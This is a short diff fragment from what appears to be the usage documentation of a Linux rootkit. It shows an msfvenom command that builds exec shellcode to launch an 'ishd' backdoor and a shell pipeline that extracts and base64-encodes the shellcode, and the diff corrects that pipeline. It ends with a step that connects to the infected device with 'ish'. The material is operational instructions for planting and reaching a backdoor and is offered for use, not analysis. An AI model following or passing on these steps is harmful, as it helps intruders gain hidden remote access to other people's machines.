@@ -26,7 +26,7 @@ msfvenom -p linux/x64/exec CMD=/path/to/ishd -f c -b "\x00\x0a\x0d" > shellcode.
 You can parse out only the shellcode and base64 encode it like this:
 
 ```
-grep '"' shellcode.txt | tr "\n" " " | sed -e 's/\" \"//g;s/\"//g;s/;//g'&& echo " " | base64
+grep '"' shellcode.txt | tr "\n" " " | sed -e 's/\" \"//g;s/\"//g;s/;//g' | base64
 ```
 
 Then you may run ish with the ip of the device the rootkit was ran on to connect.
